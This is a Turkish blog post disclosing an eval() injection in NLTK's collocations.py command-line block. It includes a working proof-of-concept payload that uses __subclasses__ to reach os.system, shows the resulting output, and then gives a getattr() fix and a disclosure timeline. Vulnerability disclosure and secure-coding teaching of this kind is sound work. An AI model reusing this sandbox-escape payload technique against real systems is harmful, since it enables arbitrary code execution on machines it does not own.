---
layout: post
title: "NLTK collocations'da eval() üzerinden komut enjeksiyonu"
author: Yunus Aydın
date: 2026-06-07
lang: tr
description: "NLTK collocations.py'de sys.argv üzerinden eval() ile komut enjeksiyonu zafiyeti. Keyfi Python kodu çalıştırma gösterildi; ancak istismar lokal CLI erişimi gerektiriyor."
keywords: "NLTK, komut enjeksiyonu, eval injection, collocations.py, sys.argv, Python güvenlik, kod enjeksiyonu, NLP güvenlik, güvenlik araştırması"
canonical_url: "https://aydinnyunus.github.io/2026/06/07/command-injection-nltk-collocations-eval-tr/"
---

Bunu 14 Kasım 2025'te huntr'a raporladım. Henüz CVE atanmadı. Zafiyet gerçek: keyfi kod çalıştırabiliyorsunuz, ama istismar için scripti lokal çalıştırmanız gerekiyor. Çoğu bug bounty için gri alan olsa da, alttaki pattern öğretici olduğu için yazıyorum.

## Savunmasız kod

`nltk/collocations.py` dosyasında modül doğrudan çağrıldığında çalışan `__main__` bloğu var. Komut satırından scoring fonksiyonu seçmek için `eval()` kullanıyor:

```python
if __name__ == "__main__":
    import sys
    from nltk.metrics import BigramAssocMeasures
    
    try:
        scorer = eval("BigramAssocMeasures." + sys.argv[1])
    except IndexError:
        scorer = None
    try:
        compare_scorer = eval("BigramAssocMeasures." + sys.argv[2])
    except IndexError:
        compare_scorer = None
```

Niyet `python -m nltk.collocations likelihood_ratio` gibi bir kullanım. Kullanıcı metod adı giriyor, kod başına `BigramAssocMeasures.` ekliyor, `eval()` da onu gerçek fonksiyona çözümlüyor.

Sorun: `sys.argv[1]`'i komutu çalıştıran herkes tamamen kontrol ediyor.

## İstismar

Python'un MRO'su ve `__subclasses__()` sayesinde herhangi bir string bağlamından nesne hiyerarşisini tırmanıp keyfi modüllere erişebilirsiniz. Payload `os.system`'e bu yoldan ulaşıyor:

```bash
python3 -m nltk.collocations '__mro__[-1].__subclasses__()[166].__init__.__globals__["sys"].modules["os"].system("id")' 'None'
```

Çıktı:

```text
<frozen runpy>:128: RuntimeWarning: 'nltk.collocations' found in sys.modules after import of package 'nltk',
but prior to execution of 'nltk.collocations'; this may result in unpredictable behaviour
uid=502(yunus.aydin) gid=20(staff) groups=20(staff),502(awagent_enrolled),501(awagent),12(everyone),
61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),...
Traceback (most recent call last):
  ...
  File ".../nltk/collocations.py", line 402, in <module>
    compare_scorer = eval("BigramAssocMeasures." + sys.argv[2])
  File "<string>", line 1
    BigramAssocMeasures.None
SyntaxError: invalid syntax
```

`id` komutu çalıştı ve uid, gid ile grupları döktü. Ardından ikinci `eval()` çağrısı `"None"` üzerinde patladı. Traceback aldatıcıdır; asıl iş 398. satırda zaten bitmişti.

## Kapsam tartışması

Huntr bunu kapsam dışı olabileceğini işaretledi: lokal CLI'da komut enjeksiyonu, ağ bileşeni yok. Mantıklı bir değerlendirme. Bunu istismar edebilmek için zaten hedef makinede kod çalıştırabilmeniz gerekiyor; o noktada bir Python scriptindeki `eval()` en ilginç saldırı vektörü olmaz.

Ama riski değerlendirmek başka. NLTK yaygın bir NLP kütüphanesi. `collocations.py` dışarıdan gelen parametrelerle çağrılıyorsa (kullanıcı girdisini `python -m nltk.collocations`'a ileten wrapper script, dinamik hücre çalıştırmalı Jupyter, config interpolasyonu yapan CI pipeline), `eval()` yolu anında problem haline geliyor. Kod, garanti edilmeyen bir çalışma ortamını varsayıyor.

Basitçe: kullanıcı kontrollü string üzerinde `eval()`, isme göre metod seçmek için doğru araç değil. Python'da bunun için `getattr()` var.

## Düzeltme

`eval()` yerine `getattr()`:

```python
if __name__ == "__main__":
    import sys
    from nltk.metrics import BigramAssocMeasures
    
    try:
        scorer = getattr(BigramAssocMeasures, sys.argv[1])
    except (IndexError, AttributeError):
        scorer = None
    try:
        compare_scorer = getattr(BigramAssocMeasures, sys.argv[2])
    except (IndexError, AttributeError):
        compare_scorer = None
```

`getattr(BigramAssocMeasures, "likelihood_ratio")`, orijinal `eval("BigramAssocMeasures.likelihood_ratio")`'nin yapmak istediğini (attribute'u çözümlemek) keyfi kod çalıştırmadan yapıyor. Geçersiz bir isim `AttributeError` fırlatıyor, çalıştırmıyor.

## `eval()` neden bu kodlarda hep çıkıyor

Python kütüphanelerindeki `__main__` bloğu genellikle hızlıca yazılıyor ve public API kadar titizlikle incelenmiyor. "Bu sadece demo", "sadece test"; daha az gözlem, daha fazla kısayol anlamına geliyor. Dinamik dispatch için `eval()` o an akıllıca geliyor. `getattr()`'u hatırlamak bir saniye daha alıyor.

Genel çıkarım: `eval()`'ı kullanıcı kontrollü herhangi bir girdide (argv, environment variable, config dosyası, HTTP parametresi) kullanmak bağlamdan bağımsız olarak code smell'dir. Yazarken düşündüğünüz ortam, kodun çalışacağı tek ortam değil.

## Raporlama zaman çizelgesi

- **14 Kasım 2025**: huntr.dev'e raporlandı
- **14 Kasım 2025**: Huntr tarafından kapsam dışı olabileceği işaretlendi (lokal CLI, ağ bileşeni yok)
- Yayın tarihi itibarıyla CVE atanmadı

## Referanslar

- **İlgili CVE**: [CVE-2026-0558: LollMS'de kimlik doğrulamasız dosya yükleme](https://www.cve.org/CVERecord?id=CVE-2026-0558)
- **CWE-95**: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')
- **NLTK**: [https://www.nltk.org/](https://www.nltk.org/)
- **Python Security**: [https://peps.python.org/pep-0665/](https://peps.python.org/pep-0665/)

## İlgili içerik

- [CVE-2026-0558: LollMS'de kimlik doğrulamasız dosya yükleme](https://aydinnyunus.github.io/2026/03/28/unauthenticated-file-upload-lollms-cve-2026-0558-tr/)
- [SQL Injection Zafiyeti: GeoPandas to_postgis() Fonksiyonunda Güvenlik Açığı](https://aydinnyunus.github.io/2025/12/27/sql-injection-geopandas-tr/)
- [SSRF in LollMS Export: CVE-2026-0560](https://aydinnyunus.github.io/2026/03/28/ssrf-lollms-export-content-cve-2026-0560-tr/)
